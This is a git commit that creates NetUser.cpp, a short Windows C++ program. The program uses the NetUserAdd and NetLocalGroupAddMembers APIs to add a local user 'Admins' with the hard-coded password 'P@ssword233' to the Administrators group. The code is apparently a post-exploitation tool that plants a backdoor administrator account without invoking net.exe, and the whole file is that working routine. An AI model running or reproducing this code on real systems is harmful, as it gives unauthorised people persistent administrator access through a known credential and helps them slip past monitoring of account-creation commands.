3c33870d8dbd7575ce1261d1f7767afea31f17a9
冷逸 <qqlengyi@163.com>
2020-12-11 13:50:36 +0800

    Create NetUser.cpp

---
+++ NetUser.cpp
@@ -0,0 +1,36 @@
+#include "stdafx.h"
+#ifndef UNICODE
+#define UNICODE
+#endif
+#pragma comment(lib,"netapi32")
+
+#include  <stdio.h>
+#include  <windows.h>
+#include  <lm.h>
+
+
+int wmain(int argc, wchar_t *argv[])
+{
+	
+	USER_INFO_1 UserInfo;
+	DWORD dwLevel = 1;
+	DWORD dwError = 0;
+
+	UserInfo.usri1_name = L"Admins";            // 账户    
+	UserInfo.usri1_password = L"P@ssword233";      // 密码
+	UserInfo.usri1_priv = USER_PRIV_USER;
+	UserInfo.usri1_home_dir = NULL;
+	UserInfo.usri1_comment = NULL;
+	UserInfo.usri1_flags = UF_SCRIPT;
+	UserInfo.usri1_script_path = NULL;
+
+	
+	NetUserAdd(NULL, dwLevel, (LPBYTE)&UserInfo, &dwError);
+
+	
+	LOCALGROUP_MEMBERS_INFO_3 account;
+	account.lgrmi3_domainandname = UserInfo.usri1_name;
+	NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1);
+
+	return 0;
+}
